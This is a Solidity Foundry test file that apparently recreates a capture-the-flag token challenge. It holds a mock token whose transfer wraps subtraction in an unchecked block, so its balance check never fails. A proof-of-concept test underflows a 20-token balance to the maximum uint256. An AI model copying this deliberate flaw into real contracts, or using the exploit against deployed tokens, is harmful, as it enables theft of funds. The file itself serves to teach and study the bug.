// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";

/**
 * @notice Replicates pre-0.8.0 underflow behavior using Solidity 0.8 `unchecked` block
 */
contract MockToken06 {
    mapping(address => uint256) balances;
    uint256 public totalSupply;

    constructor(uint256 _initialSupply) {
        balances[msg.sender] = totalSupply = _initialSupply;
    }

    function transfer(address _to, uint256 _value) public returns (bool) {
        unchecked {
            require(balances[msg.sender] - _value >= 0);
            balances[msg.sender] -= _value;
            balances[_to] += _value;
            return true;
        }
    }

    function balanceOf(address _owner) public view returns (uint256 balance) {
        return balances[_owner];
    }
}

contract TokenTest is Test {
    MockToken06 public token;
    address public deployer = makeAddr("deployer");
    address public player = makeAddr("player");

    function setUp() public {
        vm.prank(deployer);
        token = new MockToken06(10000);

        // Allocate 20 tokens to the player (as per challenge rules)
        vm.prank(deployer);
        token.transfer(player, 20);
    }

    function test_InitialBalance() public view {
        assertEq(token.balanceOf(player), 20);
    }

    function test_UnderflowExploit() public {
        vm.startPrank(player);

        // Transfer 21 tokens when player only owns 20.
        // Underflow: 20 - 21 = 2^256 - 1 (type(uint256).max)
        token.transfer(address(0xdead), 21);

        uint256 newBalance = token.balanceOf(player);
        assertEq(newBalance, type(uint256).max);

        console2.log("Local PoC Success: Balance underflowed to max uint256:");
        console2.log(newBalance);

        vm.stopPrank();
    }
}
